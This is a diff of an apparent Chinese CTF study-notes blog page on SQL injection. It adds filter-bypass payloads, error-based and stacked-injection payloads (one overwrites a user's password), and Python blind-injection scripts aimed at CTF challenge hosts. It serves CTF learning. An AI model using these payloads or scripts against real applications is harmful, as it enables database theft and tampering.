@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2023-01-10T02:35:56.000Z">
-<meta property="article:modified_time" content="2023-03-12T09:43:56.845Z">
+<meta property="article:modified_time" content="2023-11-12T06:28:18.316Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="SQL_Injection">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~13.29K
+                        ~28.95K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1678614236845"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1699770498316"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -236,11 +236,15 @@
 <h2><span id="2编码"> 2.编码：</span></h2>
 <p>进行url编码，如and（&amp;&amp;）可以尝试使用%26%26</p>
 <p>如#可以使用%23</p>
+<p>有些时候也可以利用hex：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273</span><br></pre></td></tr></table></figure>
 <h2><span id="3内联注释"> 3.内联注释：</span></h2>
 <p>空格被过滤的一个方法：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#</span><br></pre></td></tr></table></figure>
 <p>另一个方法就是使用括号：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from inforamtion_schema.tables where table_schema=database())),3)#</span><br></pre></td></tr></table></figure>
+<p>换用<code>tab</code>，<code>%a0</code></p>
+<p>(我记得<code>%a0</code>也能绕过?)</p>
 <h2><span id="4双写绕过"> 4.双写绕过：</span></h2>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,2,3#</span><br></pre></td></tr></table></figure>
 <p>将中间的union和select删除后又有union select，绕过成功</p>
@@ -257,6 +261,32 @@
 <p><strong>updated in 2023/3/11</strong></p>
 <p>可以通过查一个不存在的表来爆出库名：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||(select *from asdf)#</span><br></pre></td></tr></table></figure>
+<h2><span id="8各种字符数字互转"> 8.各种字符数字互转</span></h2>
+<ul>
+<li>
+<p><code>ascii</code>，常用于盲注，字符转ascii码</p>
+</li>
+<li>
+<p><code>ord</code>，等效替代<code>ascii</code></p>
+</li>
+<li>
+<p><code>hex</code>，传入字符或者十进制数返回十六进制</p>
+</li>
+<li>
+<p><code>unhex</code>，hex的反向</p>
+</li>
+<li>
+<p><code>char</code>，ascii、ord的反向</p>
+</li>
+</ul>
+<h2><span id="9过滤了select"> 9.过滤了select</span></h2>
+<p>条件：mysql8</p>
+<p>利用列比较：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查库</span><br><span class="line">(&#x27;def&#x27;, &#x27;&#123;target+chr(ascii)&#125;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&gt;(table information_schema.schemata limit 4,1)</span><br></pre></td></tr></table></figure>
+<p>查表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;ctf&#x27;,&#x27;&#123;flag+chr(ascii)&#125;&#x27;,&#x27;2021-04-30 21:15:31&#x27;,0,0,0)&gt;(table mysql.innodb_table_stats limit 1,1)</span><br></pre></td></tr></table></figure>
+<p>查记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex((table ctf.fl11aag limit 1,1))</span><br></pre></td></tr></table></figure>
 <h1><span id="0x04-sql注入类型"> 0x04 SQL注入类型</span></h1>
 <p>分为字符型和数字型两种</p>
 <p>判断方式也很简单：</p>
@@ -283,7 +313,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(id,&#x27;--&#x27;,username,&#x27;--&#x27;,password),3 from column_name#</span><br><span class="line">这样子回显出来的结果会比较好看（因为有--分隔）</span><br></pre></td></tr></table></figure>
 <h2><span id="2报错注入"> 2.报错注入</span></h2>
 <p>报错注入适用于没有回显位的，但是页面有报错信息的时候</p>
-<p>有三种注入方式（雾）</p>
 <p><font color="blue">1.group by 重复键冲</font></p>
 <p>反正我是看不懂：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
@@ -297,11 +326,40 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3)#</span><br></pre></td></tr></table></figure>
 <p>注意报错注入只能回显前32个字符，爆flag时可能需要添加reverse函数：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(&#x27;~&#x27;,(select(reverse(group_concat(text))) from wfy_comments)),3)#</span><br></pre></td></tr></table></figure>
+<p><strong>exp、pow、溢出</strong>：</p>
+<p>version: 5.5.5 - 5.5.49</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select * from (select user())a));</span><br><span class="line"></span><br><span class="line">select pow(2,~(select * from (select user())a));</span><br><span class="line"></span><br><span class="line">select 1+(~(select * from (select user())a));</span><br></pre></td></tr></table></figure>
+<p><strong>name_const</strong>：</p>
+<p>查询数据库版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select name_const(version(),1),name_const(version(),1))a;</span><br></pre></td></tr></table></figure>
+<p><strong>uuid</strong>：</p>
+<p>适用版本 8.0.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select uuid_to_bin((database()));</span><br><span class="line">select bin_to_uuid((database()));</span><br></pre></td></tr></table></figure>
+<p><strong>join</strong></p>
+<p>利用重复查询相同表的方法来爆数据：</p>
+<p>sql语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from 表 a join 表 b)c  //爆表的第一列</span><br><span class="line">select * from(select * from 表 a join 表 b using(第一列列名))c //爆第二个列名</span><br><span class="line">select * from(select * from 表 a join 表 b using(第一列列名,第二列列名))c //爆第三个列名</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>搭配报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; || extractvalue(1,concat(0x7e,(select * from (select * from output a join output b)c)))#</span><br><span class="line">//爆出output表的第一个列名</span><br><span class="line">回显：Duplicate column name &#x27;data&#x27;</span><br><span class="line"></span><br><span class="line">1&#x27; || extractvalue(1,concat(0x7e,(select * from (select * from output a join output b using(data))c)))#</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>需要提前知道表名</p>
+<p><strong>gtid</strong></p>
+<p>仅一列，可以查<code>user、version、database</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select gtid_subset(user(),1);</span><br><span class="line">select gtid_subtract(user(),1);</span><br></pre></td></tr></table></figure>
+<p><strong>polygon</strong></p>
+<p>前提需要知道字段名：</p>
+<p>爆当前查询语句的库、表、字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select flag from ctf where polygon(id);</span><br><span class="line">#Illegal non geometric &#x27;`test`. `ctf`.`id`&#x27; value</span><br><span class="line">select flag from ctf where polygon(flag);</span><br></pre></td></tr></table></figure>
 <h2><span id="3堆叠注入"> 3.堆叠注入</span></h2>
 <p>在SQL中（以及在很多的地方中），分号表示命令的分隔，也就是SQL语句的结束，如果使用;后再在后面构造SQL语句，两条是可以一起执行的,例如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;123456&#x27; where id=1;#</span><br></pre></td></tr></table></figure>
 <p>（此处可左转NewStarCTF week 3的multi SQL）</p>
 <p>将id为1的密码更新为123456</p>
+<p>使用条件：</p>
+<ul>
+<li>mysql能够执行多条语句的时候，例如：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php</span></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line"> <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        <span class="comment">#cursor.execute(&#x27;SELECT * FROM userinfo order by %s&#x27; % field) cursor.execute/fetchall只会回显第一条mysql语句的执行结果</span></span><br><span class="line">        cursor.execute(<span class="string">&#x27;SELECT * FROM userinfo order by %s;&#x27;</span> % field)</span><br><span class="line">        res = cursor.fetchall()</span><br></pre></td></tr></table></figure>
 <p>爆库：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure>
 <p>爆表：</p>
@@ -310,20 +368,100 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show xxx from xxxx;#</span><br></pre></td></tr></table></figure>
 <p>查看内容：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler `表名` open as `a`;handler `a` read next;#</span><br></pre></td></tr></table></figure>
+<p>重命名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename table tb1 to tb3;</span><br><span class="line">rename table tb2 to tb1;</span><br><span class="line"></span><br><span class="line">alter table tb1 change column1 column2 char(100);</span><br></pre></td></tr></table></figure>
 <p>如果update等被过滤，可以使用sql预处理语句进行拼接：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;u&#x27;,&#x27;pdate `score` listen=99999 where username=&quot;火华&quot;&#x27;);prepare sql_exe from @sql;execute sql_exe;#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;set @sql=concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from xxx&#x27;);prepare sql_exe from @sql; execute sql_exe;</span><br></pre></td></tr></table></figure>
+<h3><span id="堆叠注入的绕过"> 堆叠注入的绕过</span></h3>
+<ul>
+<li>分号的过滤可以利用<code>\G</code>替代(待验证)</li>
+<li>如果查询语句(select)这些一直被过滤，可以考虑利用十六进制：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;sEt/**/@a=0x.....;PRepare/**/hello/**/from/**/@a;execute/**/hello;#</span><br></pre></td></tr></table></figure>
+<p>此时就能执行我们的sql注入语句</p>
+<p>盲注：</p>
+<p>0xgame2023:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://124.71.184.68:50021/?order=id&#x27;</span></span><br><span class="line"><span class="comment">#select (flag) from (flag)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;&quot;</span> <span class="comment">#结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>): <span class="comment">#循环</span></span><br><span class="line">    left=<span class="number">32</span></span><br><span class="line">    right=<span class="number">128</span></span><br><span class="line">    mid=(left + right) //<span class="number">2</span>  <span class="comment">#二分中值</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        turn = <span class="string">b&quot;select if(ascii(substr((select (flag) from (flag)),%d,1))&lt;%d,sleep(3.5),1);&quot;</span>%(i,mid)</span><br><span class="line">        turned = binascii.b2a_hex(turn)</span><br><span class="line">        turned = <span class="built_in">str</span>(turned, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        turned = <span class="string">&quot;0x&quot;</span>+turned</span><br><span class="line">        payload = url+<span class="string">&#x27;;sEt/**/@a=%s;PRepare/**/hello/**/from/**/@a;execute/**/hello;&#x27;</span>%(turned)+<span class="string">&quot;%23&quot;</span>  <span class="comment">#sEt @a=&quot;select if(ascii(substr((select (flag) from (flag)),1,1))&lt;130,sleep(5),1);&quot;;PRepare hello from @a;execute hello;#</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        times = time.time() <span class="comment">#发送访问请求前的时间</span></span><br><span class="line">        html = requests.get(payload)</span><br><span class="line">        timee = time.time() <span class="comment">#发送访问后的时间</span></span><br><span class="line">        keep = timee - times <span class="comment">#当然是大-小</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment">#防止429</span></span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">3.4</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) //<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Results:&quot;</span>,res) <span class="comment">#输出最终结果</span></span><br><span class="line"><span class="comment">#print(&quot;Final Results:&quot;,res[::-1]) #如果选择倒序，选这个</span></span><br></pre></td></tr></table></figure>
 <h2><span id="4布尔盲注"> 4.布尔盲注</span></h2>
 <p>适用于页面只有两种回显结果，没有任何错误回显</p>
+<ul>
+<li>还有可能也是以下情况：</li>
+</ul>
+<ol>
+<li>HTTP状态响应码不同</li>
+<li>响应头变化(比如302，或者设置了cookie)</li>
+<li>报错(?)</li>
+</ol>
 <p>有的时候也可以使用异或符号（页面有1和0的时候）</p>
 <p>直接用脚本跑就行了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys<span class="comment">#头文件</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://1189e07b-be07-49cc-9b96-af07b0b4f9b0.node4.buuoj.cn:81/search.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;&quot;</span> <span class="comment">#结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>): <span class="comment">#循环</span></span><br><span class="line">        left=<span class="number">32</span></span><br><span class="line">        right=<span class="number">128</span></span><br><span class="line">        mid=(left + right) //<span class="number">2</span>  <span class="comment">#二分中值</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr(database(),%d,1))&lt;%d)#&quot;%(i,mid)#爆库</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)#&quot;%(i,mid)#爆表</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&lt;%d)#&quot;%(i,mid)#爆列</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(id,username,password))from(F1naI1y)),%d,1))&lt;%d)#&quot;%(i,mid) #爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环</span></span><br><span class="line">                payload = url+<span class="string">&quot;1^(ascii(substr((select(reverse(group_concat(id,username,password)))from(F1naI1y)),%d,1))&lt;%d)#&quot;</span>%(i,mid) <span class="comment">#爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环，倒序输出</span></span><br><span class="line">                html = requests.get(payload)</span><br><span class="line">                <span class="built_in">print</span>(payload)</span><br><span class="line">                time.sleep(<span class="number">0.04</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> html.text: <span class="comment">#这里写入的传参值是&lt; 返回的是ERROR才是对的反应</span></span><br><span class="line">                        right = mid <span class="comment">#如果有延时，右值取中值，再用左+右/2的新区间值与ascii比较(例如，第一次是ascii与80,如果小于80 用ascii与32+80/2=56比较)</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        left = mid + <span class="number">1</span>  <span class="comment">#如果没有，左值取中值+1，取（81,132）中值比较，ascii值比mid值要大</span></span><br><span class="line">                mid = (left + right) // <span class="number">2</span> <span class="comment">#重复上述过程</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">                <span class="keyword">break</span> <span class="comment">#防止超出ascii码值</span></span><br><span class="line">        res += <span class="built_in">chr</span>(mid-<span class="number">1</span>) <span class="comment">#小于号，值要-1</span></span><br><span class="line">        <span class="built_in">print</span>(res) <span class="comment">#打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br><span class="line"><span class="comment">#print(&quot;Final Result:&quot;,res[::-1]) #采用倒序输出时，将结果正向输出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通的查询语句为：</span><br><span class="line"><span class="comment">#payload=url+&quot;1&#x27; and ascii(substr(database(),%d,1))&lt;%d#&quot;%(i,mid)</span></span><br></pre></td></tr></table></figure>
+<h3><span id="41-常用绕过"> 4.1 常用绕过</span></h3>
+<p><code>left</code>：</p>
+<p><strong>left(str, length)</strong>，从左边开始截取长度为length的字符串，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select left(&#x27;www.baidu.com&#x27;, 8)</span><br><span class="line">#www.baid</span><br></pre></td></tr></table></figure>
+<p>与之对应的还有right，但是right是从右边往左截取的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select right(&#x27;www.baidu.com&#x27;, 8)</span><br><span class="line">#aidu.com</span><br></pre></td></tr></table></figure>
+<p><strong>substring(str, index, length)</strong>，截取特定长度的字符串，相当于<code>substr</code></p>
+<p><strong>mid(str, index, length)</strong>，同<code>substr</code></p>
+<p><strong>strcmp()</strong>，比较字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select strcmp(12345, 123456);</span><br><span class="line">#-1</span><br><span class="line">select strcmp(1234567, 123456);</span><br><span class="line">#1</span><br><span class="line">select strcmp(123456, 123456);</span><br><span class="line">#1</span><br></pre></td></tr></table></figure>
+<p>利用<strong>strcmp</strong>代替等号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where !strcmp(table_schema, &#x27;ctf&#x27;);</span><br><span class="line">#相当于where table_schema=&#x27;ctf&#x27;;</span><br></pre></td></tr></table></figure>
+<p><strong>between and</strong>也有类似的效果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where table_schema between &#x27;ctf&#x27; and &#x27;ctf&#x27;</span><br></pre></td></tr></table></figure>
+<p>代替等号的还有<strong>in</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where table_schema in (&#x27;ctf&#x27;)</span><br></pre></td></tr></table></figure>
+<p>jacko神的exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://a.y1ng.vip:1119/&quot;</span><br><span class="line"></span><br><span class="line"># data=&quot;password=&amp;username=&#x27;%2bstrcmp(left(database(),&#123;&#125;),&#x27;&#123;&#125;&#x27;)%23&quot;#ctfgame</span><br><span class="line"># data=&quot;password=&amp;username=&#x27;%2bstrcmp(left(hex((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics/**/where/**/!strcmp(table_schema,&#x27;ctfgame&#x27;))),&#123;&#125;),&#x27;&#123;&#125;&#x27;)%23&quot;#SeCrrreT</span><br><span class="line">data=&quot;password=&amp;username=&#x27;%2bstrcmp(left(hex((select group_concat(`1`) from (select 1,2 union select * from SeCrrreT)x)),&#123;&#125;),&#x27;&#123;&#125;&#x27;)%23&quot;.replace(&#x27; &#x27;,&#x27;/**/&#x27;)#1,flag&#123;fab99a66-23db-47b1-9db4-9262664d76a8&#125;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">&#125;</span><br><span class="line">length = 1</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    # for i in range(32,128):</span><br><span class="line">    # for i in &#x27;abcdef&#x27;+string.digits:</span><br><span class="line">    for i in string.ascii_lowercase+string.digits+&#x27;,_-&#123;&#125;&#x27;:</span><br><span class="line">        payload = data.format(length, result+i)</span><br><span class="line">        r = requests.post(url=url, data=payload,headers=header)</span><br><span class="line">        # print(r.request.body)</span><br><span class="line">        # print(r.text)</span><br><span class="line"></span><br><span class="line">        if &#x27;Admin&#x27; in r.text:</span><br><span class="line">            result = result+i</span><br><span class="line">            print(result)</span><br><span class="line">            length += 1</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<p><strong>like、regexp</strong>：</p>
+<p>regexp盲注：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select database())regexp &#x27;^p&#x27;#</span><br></pre></td></tr></table></figure>
+<p>rlike也是等效的</p>
+<p>like:</p>
+<p>没有<code>%</code>时，like可以代替等号</p>
+<p>在有<code>%</code>时，等效于regexp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select database())like &#x27;p%&#x27;#</span><br></pre></td></tr></table></figure>
+<p><strong>绕过逗号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#x27;test&#x27; from 1 for 2);</span><br><span class="line"></span><br><span class="line">select substring(&#x27;test&#x27; from 1 for 2);</span><br><span class="line"></span><br><span class="line">相当于 substr(&#x27;test&#x27;,1,2);</span><br></pre></td></tr></table></figure>
+<p><strong>利用trim</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select trim([both/leading/trailing]) &#x27;x&#x27; from &#x27;xxx&#x27;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select trim(leading &#x27;a&#x27; from &#x27;abc&#x27;);--bc</span><br><span class="line">select trim(leading &#x27;b&#x27; from &#x27;abc&#x27;);--abc</span><br></pre></td></tr></table></figure>
+<h3><span id="42-基于报错的布尔盲注"> 4.2 基于报错的布尔盲注</span></h3>
+<p><strong>exp</strong>：e的指数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#当值大于709时就会报错：</span><br><span class="line">select exp(710);</span><br><span class="line">#ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure>
+<p>利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT ~0;</span><br></pre></td></tr></table></figure>
